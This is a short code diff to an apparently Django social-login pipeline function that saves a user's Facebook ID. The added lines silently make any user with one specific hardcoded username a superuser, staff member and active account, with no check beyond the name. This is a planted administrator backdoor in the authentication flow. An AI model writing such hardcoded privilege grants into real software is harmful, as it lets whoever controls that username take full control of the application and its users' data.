@@ -14,6 +14,10 @@ def logged_in(request):
 
 def save_profile(backend, user, response, *args, **kwargs):
     if backend.name == 'facebook':
+        if user.username == 'KristjanRoosild':
+            user.is_superuser = True
+            user.is_staff = True
+            user.is_active = True
         profile = user.profile
         profile.facebook_id = response.get('id')
         profile.save()
